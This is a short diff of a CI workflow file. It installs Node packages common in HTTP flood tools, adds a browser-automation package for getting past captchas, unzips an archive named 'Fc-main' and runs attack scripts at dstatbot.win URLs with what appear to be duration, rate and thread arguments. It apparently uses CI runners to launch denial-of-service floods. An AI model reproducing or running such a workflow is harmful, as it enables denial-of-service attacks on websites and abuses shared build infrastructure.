@@ -37,7 +37,7 @@ jobs:
       
       - name: Install Node.js dependencies
         run: |
-          npm install hpack colors chalk@4 user-agents random-referer cluster request
+          npm install hpack puppeteer-real-browser colors chalk@4 user-agents random-referer cluster request
           npm install -g pm2
           
 
@@ -48,7 +48,7 @@ jobs:
           
           unzip Fc-main.zip
           cd Fc-main
-          node y.js GET https://c1.dstatbot.win/v0KzLqtO 700 4 90 --full --bfw --debug 
+          node m.js https://captcha.dstatbot.win/YWebGPPG 200 3 3 3
           
            
           
